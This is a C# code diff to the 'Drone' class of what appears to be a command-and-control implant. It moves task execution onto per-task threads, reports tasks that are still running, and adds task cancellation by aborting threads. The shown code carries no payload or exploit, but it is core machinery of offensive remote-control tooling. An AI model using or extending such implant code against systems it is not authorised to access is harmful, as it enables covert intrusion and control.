@@ -21,6 +21,7 @@ public class Drone
     private IHandler _handler;
 
     private readonly List<DroneFunction> _commands = new();
+    private readonly Dictionary<string, Thread> _threads = new();
     
     private bool _running;
     
@@ -58,17 +59,11 @@ public class Drone
     private void HandleC2Messages(IEnumerable<C2Message> messages)
     {
         foreach (var message in messages)
-        {
-            var thread = new Thread(HandleC2Message);
-            thread.Start(message);
-        }
+            HandleC2Message(message);
     }
 
-    private void HandleC2Message(object obj)
+    private void HandleC2Message(C2Message message)
     {
-        if (obj is not C2Message message)
-            return;
-        
         // decrypt message
         IEnumerable<DroneTask> tasks;
         
@@ -88,11 +83,18 @@ public class Drone
     private void HandleC2Tasks(IEnumerable<DroneTask> tasks)
     {
         foreach (var task in tasks)
-            HandlerC2Task(task);
+        {
+            var thread = new Thread(HandleC2Task);
+            _threads.Add(task.TaskId, thread);
+            thread.Start(task);
+        }
     }
 
-    private void HandlerC2Task(DroneTask task)
+    private void HandleC2Task(object obj)
     {
+        if (obj is not DroneTask task)
+            return;
+        
         var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Function));
         
         if (command is null)
@@ -103,12 +105,20 @@ public class Drone
 
         try
         {
+            // blocks
             command.Execute(task);
+        }
+        catch (ThreadAbortException)
+        {
+            SendTaskComplete(task.TaskId);
         }
         catch (Exception e)
         {
             SendError(task.TaskId, e.Message);
         }
+
+        if (_threads.ContainsKey(task.TaskId))
+            _threads.Remove(task.TaskId);
     }
 
     public void SendError(string id, string error)
@@ -123,15 +133,15 @@ public class Drone
         SendTaskResponse(response);
     }
 
-    public void SendOutput(string id, string output)
+    public void SendOutput(string id, string output, bool stillRunning = false)
     {
         var response = new DroneTaskOutput
         {
             TaskId = id,
-            Status = DroneTaskOutput.TaskStatus.Complete,
+            Status = stillRunning ? DroneTaskOutput.TaskStatus.Running : DroneTaskOutput.TaskStatus.Complete,
             Output = Encoding.UTF8.GetBytes(output)
         };
-        
+
         SendTaskResponse(response);
     }
 
@@ -149,6 +159,17 @@ public class Drone
     public void SendTaskResponse(DroneTaskOutput output)
     {
         _handler.QueueOutbound(output);
+    }
+
+    public bool CancelTask(string taskId)
+    {
+        if (!_threads.TryGetValue(taskId, out var thread))
+            return false;
+        
+        _threads.Remove(taskId);
+        
+        thread.Abort();
+        return true;
     }
 
     public void Stop()
